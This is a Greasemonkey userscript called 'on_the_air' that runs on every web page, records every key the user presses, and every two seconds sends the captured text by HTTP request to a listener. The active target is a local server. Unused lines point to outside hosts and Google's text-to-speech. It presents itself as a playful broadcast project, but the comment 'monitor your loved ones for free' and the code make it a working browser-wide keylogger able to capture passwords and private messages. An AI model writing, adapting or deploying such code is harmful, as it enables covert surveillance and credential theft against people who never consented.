// ==UserScript==
// @name           on_the_air
// @namespace      *
// @include        *
// @description	  Google sings out what you type
// ==/UserScript==
//Broadcast your opinions and monitor your loved ones for free. Spread noise through search engines

var keys ='';
var keytime = new Date().valueOf();

function send () {
    // sends keys if it hs content,,,
    var now = new Date().valueOf();
    var since = now - keytime;
    // GM_log("since: "+since);

    if (keys.length && (since >= 2000)) {
        //GM_log("nothingfter3secs... send");

        //url_link = "http://wkmindware.htw.pl/test.php?keys=" +keys;
        some  = "http://translate.google.com/translate_tts?q="+ keys +"&tl=auto&prev=input";
        var dt = "http://pzwart3.wdka.hro.nl/~dmedic/cgi-bin/listener.cgi?text=" + keys;
	var url_link = "http://127.0.0.1:8000/?text=" + encodeURIComponent(keys);
	keys = '';

	var request = new XMLHttpRequest();
	request.onload = function() {
		// show nothing
	};
	request.onerror = function(error) {
    		alert("ontheair: error connecting to " + url_link);
  	};
	request.timeout = 4000;
	request.open("get", url_link, true);
	request.send();
    }
    window.setTimeout(send, 500);
}
send();

unsafeWindow.onkeypress = function(e) {
    eventobj = window.event?event:e;
    key = eventobj.keyCode?eventobj.keyCode:eventobj.charCode;
    if (key!=8) { // 8 = BS
        keys += String.fromCharCode(key);
    }
    keytime = new Date().valueOf();
}
